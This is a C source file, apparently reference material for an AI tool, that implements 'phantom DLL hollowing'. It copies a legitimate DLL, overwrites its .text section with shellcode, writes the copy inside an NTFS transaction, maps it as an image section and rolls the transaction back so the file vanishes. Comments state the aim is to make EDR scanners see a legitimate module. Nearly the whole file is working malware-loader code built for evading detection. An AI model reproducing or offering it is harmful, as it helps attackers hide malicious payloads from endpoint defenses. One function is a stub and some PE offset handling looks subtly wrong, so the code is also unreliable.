// Reference code for Noctis-MCP AI intelligence system
// Phantom DLL Hollowing Implementation

#include "phantom_dll_hollowing.h"
#include <stdio.h>

// Dynamically resolve NTDLL functions
static fnNtCreateTransaction pNtCreateTransaction = NULL;
static fnNtRollbackTransaction pNtRollbackTransaction = NULL;
static fnNtCreateSection pNtCreateSection = NULL;
static fnNtMapViewOfSection pNtMapViewOfSection = NULL;

// Initialize NTDLL function pointers
BOOL _Phantom_InitializeFunctions() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    pNtCreateTransaction = (fnNtCreateTransaction)GetProcAddress(hNtdll, "NtCreateTransaction");
    pNtRollbackTransaction = (fnNtRollbackTransaction)GetProcAddress(hNtdll, "NtRollbackTransaction");
    pNtCreateSection = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");

    return (pNtCreateTransaction && pNtRollbackTransaction &&
            pNtCreateSection && pNtMapViewOfSection);
}

// Initialize Phantom DLL Hollowing context
BOOL Phantom_Initialize(
    PPHANTOM_CONTEXT pContext,
    PVOID pShellcode,
    SIZE_T szShellcodeSize,
    LPCWSTR wzSourceDLL
) {
    if (!pContext || !pShellcode || szShellcodeSize == 0 || !wzSourceDLL) return FALSE;

    ZeroMemory(pContext, sizeof(PHANTOM_CONTEXT));

    // Store configuration
    pContext->config.pShellcode = pShellcode;
    pContext->config.szShellcodeSize = szShellcodeSize;
    wcsncpy_s(pContext->config.wzSourceDLL, MAX_PATH, wzSourceDLL, _TRUNCATE);

    // Generate temporary transaction file path
    WCHAR wzTempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, wzTempPath) == 0) return FALSE;

    swprintf_s(pContext->config.wzTempPath, MAX_PATH,
               L"%s\\phantom_%08X.dll", wzTempPath, GetTickCount());

    // Initialize NTDLL functions
    if (!_Phantom_InitializeFunctions()) {
        return FALSE;
    }

    return TRUE;
}

// Internal: Create NTFS transaction
BOOL _Phantom_CreateTransaction(PPHANTOM_CONTEXT pContext) {
    if (!pContext) return FALSE;

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = pNtCreateTransaction(
        &pContext->hTransaction,
        TRANSACTION_ALL_ACCESS,
        &objAttr,
        NULL,  // No UOW
        NULL,  // No TM handle
        0,     // CreateOptions
        0,     // IsolationLevel
        0,     // IsolationFlags
        NULL,  // Timeout
        NULL   // Description
    );

    return (status == 0); // NT_SUCCESS
}

// Internal: Create transactional file
BOOL _Phantom_CreateTransactionalFile(PPHANTOM_CONTEXT pContext) {
    if (!pContext || pContext->hTransaction == NULL) return FALSE;

    // Load source DLL into memory
    HANDLE hSourceFile = CreateFileW(
        pContext->config.wzSourceDLL,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hSourceFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD dwFileSize = GetFileSize(hSourceFile, NULL);
    PVOID pDLLBuffer = HeapAlloc(GetProcessHeap(), 0, dwFileSize);
    if (!pDLLBuffer) {
        CloseHandle(hSourceFile);
        return FALSE;
    }

    DWORD dwBytesRead;
    BOOL bResult = ReadFile(hSourceFile, pDLLBuffer, dwFileSize, &dwBytesRead, NULL);
    CloseHandle(hSourceFile);

    if (!bResult || dwBytesRead != dwFileSize) {
        HeapFree(GetProcessHeap(), 0, pDLLBuffer);
        return FALSE;
    }

    // Create transactional file using CreateFileTransacted
    typedef HANDLE (WINAPI *fnCreateFileTransactedW)(
        LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE, HANDLE, PUSHORT, PVOID
    );

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    fnCreateFileTransactedW pCreateFileTransactedW =
        (fnCreateFileTransactedW)GetProcAddress(hKernel32, "CreateFileTransactedW");

    if (!pCreateFileTransactedW) {
        HeapFree(GetProcessHeap(), 0, pDLLBuffer);
        return FALSE;
    }

    pContext->hFile = pCreateFileTransactedW(
        pContext->config.wzTempPath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        pContext->hTransaction,
        NULL,
        NULL
    );

    if (pContext->hFile == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, pDLLBuffer);
        return FALSE;
    }

    // CRITICAL FIX: Modify DLL BEFORE writing to file
    if (!Phantom_ModifyDLL(pDLLBuffer, dwFileSize,
                          pContext->config.pShellcode,
                          pContext->config.szShellcodeSize)) {
        CloseHandle(pContext->hFile);
        pContext->hFile = INVALID_HANDLE_VALUE;
        HeapFree(GetProcessHeap(), 0, pDLLBuffer);
        return FALSE;
    }

    // Write modified DLL to transactional file
    DWORD dwBytesWritten;
    bResult = WriteFile(pContext->hFile, pDLLBuffer, dwFileSize, &dwBytesWritten, NULL);
    HeapFree(GetProcessHeap(), 0, pDLLBuffer);

    return (bResult && dwBytesWritten == dwFileSize);
}

// Internal: Hollow DLL .text section with shellcode
BOOL _Phantom_HollowDLL(PPHANTOM_CONTEXT pContext) {
    if (!pContext || !pContext->config.pShellcode) return FALSE;

    // This is a simplified version - real implementation would:
    // 1. Parse PE headers to find .text section
    // 2. Verify shellcode fits in .text
    // 3. Replace .text section contents with shellcode
    // 4. Adjust section characteristics (RX permissions)

    // For reference implementation, assume shellcode preparation is external
    return TRUE;
}

// Internal: Map transactional file to memory
BOOL _Phantom_MapToMemory(PPHANTOM_CONTEXT pContext) {
    if (!pContext || pContext->hFile == INVALID_HANDLE_VALUE) return FALSE;

    NTSTATUS status;

    // Create section from transactional file
    status = pNtCreateSection(
        &pContext->hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_EXECUTE_READ,
        SEC_IMAGE,  // Critical: SEC_IMAGE for DLL-backed appearance
        pContext->hFile
    );

    if (status != 0) return FALSE;

    // Map section to current process
    pContext->pMappedBase = NULL;
    pContext->szMappedSize = 0;

    status = pNtMapViewOfSection(
        pContext->hSection,
        GetCurrentProcess(),
        &pContext->pMappedBase,
        0,
        0,
        NULL,
        &pContext->szMappedSize,
        1,  // ViewShare
        0,
        PAGE_EXECUTE_READ
    );

    return (status == 0);
}

// Internal: Rollback transaction (phantom state)
BOOL _Phantom_RollbackTransaction(PPHANTOM_CONTEXT pContext) {
    if (!pContext || pContext->hTransaction == NULL) return FALSE;

    NTSTATUS status = pNtRollbackTransaction(pContext->hTransaction, TRUE);

    // After rollback, file disappears but memory mapping remains
    // This creates the "phantom module" state

    return (status == 0);
}

// Execute Phantom DLL Hollowing
BOOL Phantom_Execute(PPHANTOM_CONTEXT pContext) {
    if (!pContext) return FALSE;

    // Step 1: Create NTFS transaction
    if (!_Phantom_CreateTransaction(pContext)) {
        return FALSE;
    }

    // Step 2: Create transactional file with modified DLL
    if (!_Phantom_CreateTransactionalFile(pContext)) {
        _Phantom_RollbackTransaction(pContext);
        return FALSE;
    }

    // Step 3: Map transactional file to memory
    if (!_Phantom_MapToMemory(pContext)) {
        _Phantom_RollbackTransaction(pContext);
        return FALSE;
    }

    // Step 4: Rollback transaction (creates phantom state)
    if (!_Phantom_RollbackTransaction(pContext)) {
        return FALSE;
    }

    // At this point:
    // - File has been deleted from disk (transaction rolled back)
    // - Memory mapping still exists (phantom module)
    // - Memory appears as IMAGE_SECTION-backed (not unbacked)
    // - EDR scanners see legitimate module, not private memory

    return TRUE;
}

// Cleanup Phantom context (rollback transaction)
VOID Phantom_Cleanup(PPHANTOM_CONTEXT pContext) {
    if (!pContext) return;

    // Unmap section if still mapped
    if (pContext->pMappedBase) {
        UnmapViewOfFile(pContext->pMappedBase);
        pContext->pMappedBase = NULL;
    }

    // Close section handle
    if (pContext->hSection) {
        CloseHandle(pContext->hSection);
        pContext->hSection = NULL;
    }

    // Close file handle
    if (pContext->hFile && pContext->hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(pContext->hFile);
        pContext->hFile = INVALID_HANDLE_VALUE;
    }

    // Rollback and close transaction if not already done
    if (pContext->hTransaction) {
        pNtRollbackTransaction(pContext->hTransaction, TRUE);
        CloseHandle(pContext->hTransaction);
        pContext->hTransaction = NULL;
    }

    // Zero context
    SecureZeroMemory(pContext, sizeof(PHANTOM_CONTEXT));
}

// Utility: Get .text section from PE
BOOL Phantom_GetTextSection(PVOID pPEBase, PVOID* ppTextAddr, SIZE_T* pszTextSize) {
    if (!pPEBase || !ppTextAddr || !pszTextSize) return FALSE;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pPEBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pPEBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    WORD wNumSections = pNtHeaders->FileHeader.NumberOfSections;

    // Find .text section
    for (WORD i = 0; i < wNumSections; i++) {
        if (memcmp(pSectionHeader[i].Name, ".text", 5) == 0) {
            *ppTextAddr = (BYTE*)pPEBase + pSectionHeader[i].VirtualAddress;
            *pszTextSize = pSectionHeader[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    return FALSE;
}

// Utility: Copy DLL and replace .text with shellcode
BOOL Phantom_ModifyDLL(PVOID pDLLBase, SIZE_T szDLLSize, PVOID pShellcode, SIZE_T szShellcodeSize) {
    if (!pDLLBase || !pShellcode || szShellcodeSize == 0) return FALSE;

    PVOID pTextAddr = NULL;
    SIZE_T szTextSize = 0;

    // Get .text section location
    if (!Phantom_GetTextSection(pDLLBase, &pTextAddr, &szTextSize)) {
        return FALSE;
    }

    // Verify shellcode fits in .text section
    if (szShellcodeSize > szTextSize) {
        return FALSE;
    }

    // CRITICAL FIX: DLL is in heap memory, just write directly (no VirtualProtect needed)
    // The buffer will be written to transactional file, not executed from this location
    memcpy(pTextAddr, pShellcode, szShellcodeSize);

    return TRUE;
}
